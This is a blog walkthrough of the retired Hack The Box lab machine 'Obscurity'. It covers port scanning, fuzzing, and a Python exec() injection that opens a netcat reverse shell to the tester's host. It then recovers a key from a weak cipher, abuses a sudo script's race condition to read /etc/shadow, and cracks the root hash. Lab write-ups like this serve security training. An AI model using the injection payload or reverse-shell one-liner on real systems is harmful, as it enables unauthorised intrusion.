---
layout: post
title: "Obscurity: Hack The Box Walkthrough"
date: 2020-05-11 06:40:20 +0000
last_modified_at: 2020-05-11 06:40:20 +0000
category: Walkthrough
tags: ["Hack The Box", Obscurity, retired]
comments: true
image:
  feature: obscurity-htb-walkthrough.jpg
  credit: PIRO4D / Pixabay
  creditlink: https://pixabay.com/illustrations/hall-stadium-obscure-space-1832930/
---

This post documents the complete walkthrough of Obscurity, a retired vulnerable [VM][1] created by [clubby789][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Obscurity is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.168 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-03 03:38:02 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.168
```

Just one open port??!! Let's do one better with `nmap` scanning the discovered port to establish the service.


```
# nmap -n -v -Pn -p8080 -A --reason -oN nmap.txt 10.10.10.168
...
PORT     STATE SERVICE    REASON         VERSION
8080/tcp open  http-proxy syn-ack ttl 63 BadHTTPServer
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Tue, 03 Dec 2019 03:50:25
|     Server: BadHTTPServer
|     Last-Modified: Tue, 03 Dec 2019 03:50:25
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|     <div class="sk-spinner sk-spinner-wordpress">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Tue, 03 Dec 2019 03:50:26
|     Server: BadHTTPServer
|     Last-Modified: Tue, 03 Dec 2019 03:50:26
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
```

Appears to be some kind of `http` service. Here's how it looks like.

{% include image.html image_alt="e62420de.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/e62420de.png" %}

Hmm. Looks like the source code for the web server is available somewhere...

### Directory/File Enumeration

Let's fuzz the directory mentioned above with `wfuzz`.

```
# wfuzz -w common.txt -t 10 --hc 404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 949

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000259:  C=200    170 L      498 W         5892 Ch        "develop"
000342:  C=404      6 L       14 W          175 Ch        "filter"^C
Finishing pending requests...
```

There's no point to show the entire source code. But I do want to draw your attention to the backdoor that's included in the source code, in line 138 and 139.

```python
info = "output = 'Document: {}'" # Keep the output for later debug
exec(info.format(path)) # This is how you do string formatting, right?
```

`exec()` is a built-in function that *supports the dynamic execution of Python code*.

### Low-Privilege Shell

Armed with this knowledge, we can execute remote Python code like so.

```
';import os;os.system("rm -rf /tmp/p; mknod /tmp/p p; bash </tmp/p | nc 10.10.15.60 1234 >/tmp/p");x='
```

Of course, I'm assuming that traditional `nc` exists and we need to `urlencode` the above string. Simply enter the encoded string into the address bar and we should have our shell.

{% include image.html image_alt="795b0b2c.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/795b0b2c.png" %}

Bingo.

### Getting `user.txt`

There's another user `robert` (uid=1000). I suppose the file `user.txt` is in his home directory.

{% include image.html image_alt="ffe06c72.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/ffe06c72.png" %}

In `check.txt`, we have our clue how to get `robert`'s password.

```
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

I suppose when we encrypt `check.txt` with a key (yet to be determined) using `SuperSecureCrypt.py`, we'll get `out.txt`. Here are the relevant `encrypt` and `decrypt` functions `SuperSecureCrypt.py`.

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted
```

It shouldn't be too hard to write a Python script to recover the key based on the "secure" algorithm above. :wink:

<div class="filename"><span>recover.py</span></div>

```python
import sys

key = ''

chk = open(sys.argv[1], 'rb').read().decode('utf-8')
out = open(sys.argv[2], 'rb').read().decode('utf-8')

keylen = int(sys.argv[3])
if (keylen > len(chk) or keylen > len(out)):
    raise ValueError("Key is longer than plaintext or ciphertext")

for x in range(keylen):
    for c in range(256):
        if ((ord(chk[x]) + c) % 255 == ord(out[x])):
            key += chr(c)
            break

print "[*] Key is: %s" % key
```

Simply increase the key size until the key repeats itself.

{% include image.html image_alt="cdf54e7d.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/cdf54e7d.png" %}

The key is `alexandrovichalexandrovich`. :triumph:

Armed with the key, we can utilize `SuperSecureCrypt.py` to get `robert`'s password.

{% include image.html image_alt="baac1320.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/baac1320.png" %}

The password is `SecThruObsFTW`. Let's log in to `robert`'s account and grab that `user.txt`!

{% include image.html image_alt="1fa5dc36.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/1fa5dc36.png" %}

## Privilege Escalation

During enumeration of `robert`'s account, I notice that `robert` is able to `sudo BetterSSH.py` as `root` without password.

{% include image.html image_alt="6d0ae26e.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/6d0ae26e.png" %}

That must be the ticket to `root`! Again, I'm showing the pertinent part where the code is vulnerable.

{% include image.html image_alt="427719f0.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/427719f0.png" %}

It's kinda like a race condition. As long as I'm able to display the contents of whatever that's written to `/tmp/SSH/<random eight chars>`, I'll be able to capture the encrypted password of `root` in `/etc/shadow`. Towards that end, I wrote a simple shell script to monitor for the creation of new file in `/tmp/SSH` and `cat` its content.

<div class="filename"><span>watch.sh</span></div>

```bash
#!/bin/bash

if [ ! -d /tmp/SSH ]; then
  mkdir -p /tmp/SSH
fi

touch /tmp/SSH/ok

while :; do
  find /tmp/SSH -type f -cnewer /tmp/SSH/ok -exec cat {} \;
done
```

I have two terminal windows. On one hand, I had the script watching for new files in `/tmp/SSH`. On the other hand, I just need to `sudo BetterSSH.py`.

{% include image.html image_alt="c115ee36.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/c115ee36.png" %}

Woohoo!

### Getting `root.txt`

Now, it's a matter of firing up John the Ripper to crack the password.

{% include image.html image_alt="6ca9732a.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/6ca9732a.png" %}

Armed with `root`'s password, getting `root.txt` should be a breeze.

{% include image.html image_alt="f003f2f9.png" image_src="/471fc23c-9a1d-4b65-974a-92b516907d9f/f003f2f9.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/219
[2]: https://www.hackthebox.eu/home/users/profile/83743
[3]: https://www.hackthebox.eu/
